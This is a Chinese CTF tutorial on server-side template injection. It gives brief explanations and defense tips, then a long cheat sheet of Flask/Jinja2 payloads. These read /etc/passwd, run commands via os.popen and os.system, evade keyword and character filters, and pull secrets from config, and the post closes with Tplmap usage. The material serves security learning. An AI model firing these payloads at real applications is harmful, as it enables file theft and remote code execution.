---
title:  Flask SSTI+姿势集+Tplmap大杀器

---

# CTF|有关SSTI的一切小秘密【Flask SSTI+姿势集+Tplmap大杀器】



## SSTI（模板注入）

首先，我们先搞清楚什么是模版引擎（SST）。

> 模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。

一个空白的 html 页面只有变量，访问这个页面时需要将这些变量转换成预期的内容，这时候就需要用到模板引擎。php（或者其他脚本语言）代码通过访问模板引擎，模板引擎通过正则匹配产生一个新的缓存的 html 页面，从而实现 php 和 html 代码的分离。

**简而言之，就是一个购物清单，将上面的一个一个商品名换成对应的商品放在购物车里。**

<img src="https://pic3.zhimg.com/80/v2-c090833ffb673f5de0a1d743b5c596e6_720w.jpg" alt="img"  />

**模板引擎的作用**

如果在一个页面中 php 代码与 html 代码混合在一起，在很多时候都会造成不便，用模板引擎可以让 php 代码和 html 代码进行分离。

**为什么模板引擎是危险的？**

SST 表面上看起来并没有什么危害，但是如果你仔细研究的话，会发现它能在模板中执行本机函数，这就意味着如果攻击者能够向模板文件中写入这种表达式，他们就能够执行任意函数。

那 require() 和 eval() 函数来说，require() 函数会包含一个文件并执行，eval() 函数不是执行文件，而是将字符串当成代码来执行。

将未经处理的输入传递给 eval() 函数是极其危险的，你们的编程老师应该都跟你们反复提到过。但是当涉及到处理模板引擎时，很多人就忽略了这一点。所以，有时候你看到的代码会是下面这样的：

```php
$templateEngine = new TemplateEngine();
$template = $templateEngine->loadString('<form method = {{method}} action = "'. $_SERVER['PHP_SELF'] . '">[...]</form>');
$template->assign('method','POST');
$template->show();
```

这段代码显示，在模板中，有一处输入是用户可控的，这就意味着用户可以执行模板表达式。

举个例子，恶意的表达式可能非常简单，比如 [[system(‘whoami’)]]，这样会执行系统命令 whoami。因此模板注入很容易导致远程代码执行（RCE），就像未经过处理的输入直接传递为 eval() 函数一样。

> SST 信任了用户的输入，并且执行这些内容，包括执行本机函数。就像 eval 函数对传入的内容未加任何过滤一样。因此模板注入很容易导致远程代码执行（RCE）、信息泄露等漏洞。

这就是我们所说的服务器端模板注入（SSTI），上面这个例子可能比较傻，但在实际中，漏洞会非常隐蔽、难以发现。比如将许多不同的组件连接在一起传递为模板引擎，但是忽视了其中的某些组件可能包含用户可控的输入等等。

**注入原理**

使用 Twig 模版引擎渲染页面，其中模版含有 {{name}} 变量，其模版变量值来自于 GET 请求参数 $_GET["name"]。

```php
<?php
    require_once dirname(__FILE__).'/../lib/Twig/Autoloader.php';
    Twig_Autoloader::register(true);
    $tw = new Twig_Environment(new Twig_Loader_String());
    $output = $tw->render("Hello {{username}}", array("username" => $_GET["username"]));  // 将用户输入作为模版变量的值
    echo $output;
?>
```

显然这段代码并没有什么问题，即使你想通过 username 参数传递一段 JavaScript 代码给服务端进行渲染，也许你会认为这里可以进行 XSS，但是由于模版引擎一般都默认对渲染的变量值进行编码和转义，所以并不会造成 XSS。

**但是，如果渲染的模版内容受到用户的控制，结果就会完全不同。**

修改代码为：

```php
<?php
    require_once dirname(__FILE__).'/../lib/Twig/Autoloader.php';
    Twig_Autoloader::register(true);
    $tw = new Twig_Environment(new Twig_Loader_String());
    $output = $tw->render("Hello {$_GET['username']}");  // 将用户输入作为模版内容的一部分
    echo $output;
?>
```

上面这段代码在构建模版时，拼接了用户输入作为模板的内容，现在如果再向服务端直接传递 JavaScript 代码，用户输入会原样输出，浏览器弹窗，XSS 构建成功。

在 Twig 模板引擎里，{{var}} 除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值，例如这里用户输入 username={{2*2}}，则在服务端拼接的模版显示结果就为：**Hello 4**

**如何防御SSTI？**

为了防止此类漏洞的存在，应该尽可能加载静态模板文件。

- 我们已经确定此功能类似于 require() 函数调用。因此，你也应该防止本地文件包含（LFI）漏洞，不要允许用户控制此类文件或其内容的路径。
- 如果需要将动态数据传递给模板，不要直接在模板文件中执行，可以使用模板引擎的内置功能来扩展表达式，实现同样的效果。

![img](https://pic3.zhimg.com/80/v2-5f58e1a2a31dbd533d82bd9dbcbb0bc2_720w.jpg)

## Flask SSTI漏洞

在 CTF 中，最常见的也就是 Jinja2 的 SSTI 漏洞了，过滤不严，构造恶意数据提交达到读取flag 或 getshell 的目的。下面以 Python 为例：

Flask SSTI 题的基本思路就是利用 python 中的 **魔术方法** 找到自己要用的函数。

- __dict__：保存类实例或对象实例的属性变量键值对字典
- __class__：返回调用的参数类型
- __mro__：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
- __bases__：返回类型列表
- __subclasses__：返回object的子类
- __init__：类的初始化方法
- __globals__：函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价

> __base__ 和 __mro__ 都是用来寻找基类的。

**基本流程**

使用魔术方法进行函数解析，再获取基本类：

```python
''.__class__.__mro__[2]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[8] //针对jinjia2/flask为[9]适用
```

获取基本类后，继续向下获取基本类 object 的子类：

```python
object.__subclasses__()
```

找到重载过的__init__类（在获取初始化属性后，带 wrapper 的说明没有重载，寻找不带 warpper 的）：

```python
>>> ''.__class__.__mro__[2].__subclasses__()[99].__init__
<slot wrapper '__init__' of 'object' objects>
>>> ''.__class__.__mro__[2].__subclasses__()[59].__init__
<unbound method WarningMessage.__init__>
```

查看其引用 __builtins__

Python 程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于 builtins 却不用导入，它在任何模块都直接可见，所以这里直接调用引用的模块。

```python
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']
```

这里会返回 dict 类型，寻找 keys 中可用函数，直接调用即可，使用 keys 中的 file 以实现读取文件的功能：

```python
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('F://GetFlag.txt').read()
```

**读写文件**

读文件：

```python
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()
```

写文件：

```python
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').write()
```

存在的子模块可以通过 .index() 来进行查询，如果存在的话返回索引，直接调用即可。

还有另外的方法：

```python
[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()
```

写文件换为 .write() 即可。

**命令执行**

**No.1**

利用eval 进行命令执行。

```python
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("whoami").read()')
```

或者。。。

**No.2**

利用warnings.catch_warnings 进行命令执行。

首先，查看 warnings.catch_warnings 方法的位置：

```python
[].__class__.__base__.__subclasses__().index(warnings.catch_warnings)
```

查看 linecatch 的位置：

```python
[].__class__.__base__.__subclasses__()[59].__init__.__globals__.keys().index('linecache')
```

查找 os 模块的位置：

```python
[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.keys().index('os')
```

查找 system 方法的位置：

```python
[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.keys().index('system')
```

调用 system 方法：

```python
[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.values()[144]('whoami')
```

**No.3**

利用 commands 进行命令执行。

```python
{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('commands').getstatusoutput('ls')
```



```python
{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('ls')
```



```python
{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
```

## 姿势集

1️⃣

{{config}} 可以获取当前设置，如果题目是这样的：

> app.config ['FLAG'] = os.environ.pop（'FLAG'）

可以直接访问 {{config['FLAG']}} 或者 {{config.FLAG}} 得到 flag。

2️⃣

同样可以找到 config。

```python
{{self.__dict__._TemplateReference__context.config}}
```

3️⃣

[]、()

```python
{{[].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG]}}
```

4️⃣

url_for、g、request、namespace、lipsum、range、session、dict、get_flashed_messages、cycler、joiner、config等

如果上面提到的 config、self 不能使用，要获取配置信息，就必须从它的全局变量（访问配置 current_app 等）。例如：

```python
{{url_for.__globals__['current_app'].config.FLAG}}
{{get_flashed_messages.__globals__['current_app'].config.FLAG}}
{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}
```

5️⃣

过滤了 []、.

pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。

```python
''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()
```

在这里使用 pop 函数并不会真的移除，但却能返回其值，取代中括号来实现绕过。

若.也被过滤，使用原生 JinJa2 函数 |attr()

即将 request.__class__ 改成 request|attr("__class__")

6️⃣

过滤下划线 _

利用 request.args 的属性

```python
{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&class=__class__&mro=__mro__&subclasses=__subclasses__
```

将其中的 request.args 改为 request.values，则利用 post 的方式进行传参。

GET:

```python
{{ ''[request.value.class][request.value.mro][2][request.value.subclasses]()[40]('/etc/passwd').read() }}
```

POST:

```python
class=__class__&mro=__mro__&subclasses=__subclasses__
```

7️⃣

过滤引号 "

request.args 是 flask 中的一个属性，为返回请求的参数，这里把 path 当作变量名，将后面的路径传值进来，进而绕过了引号的过滤。

```python
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&path=/etc/passwd
```

8️⃣

一些关键字被过滤。

**base64编码绕过**
用于__getattribute__使用实例访问属性时。

例如，过滤掉 __class__ 关键词

```python
{{[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()}}
```

**字符串拼接绕过**

```python
{{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]("/etc/passwd").read()}}
{{[].__getattribute__(['__c','lass__']|join).__base__.__subclasses__()[40]}} 
```

## Tplmap

> 服务器端模板注入和代码注入检测与开发工具

一个 python 工具，可以通过使用沙箱转义技术找到代码注入和服务器端模板注入（SSTI）漏洞。该工具能够在许多模板引擎中利用 SSTI 来访问目标文件或操作系统。一些受支持的模板引擎包括 PHP、Ruby、JaveScript、Python、ERB、Jinja2 和 Tornado。该工具可以执行对这些模板引擎的盲注入，并具有执行远程命令的能力。

**使用**

获取：[https://github.com/epinna/tplmap](https://link.zhihu.com/?target=https%3A//github.com/epinna/tplmap)

安装第三方依赖：

```bash
pip install -r requirements
```

Tplmap 不仅利用了文件系统的漏洞，而且还具有使用不同参数访问底层操作系统的能力。以下屏幕截图显示了可用于访问操作系统的不同参数选项。

以下命令可用于测试目标URL中的易受攻击的参数。

```text
./tplmap.py -u <'目标网址'>
```

执行该命令后，该工具会针对多个插件测试目标 URL 以查找代码注入机会。

有关 **SSTI** 的内容就简单介绍到这里，向作者致敬。更多有关内容请前往 [二向箔安全](https://link.zhihu.com/?target=https%3A//twosecurity.cn/%3Fquery_ref%3DqGLdXm) 进行学习，最近推出了一系列免费的网络安全技能包，有关CTF、渗透测试、网络攻防、黑客技巧尽在其中，学它涨姿势 。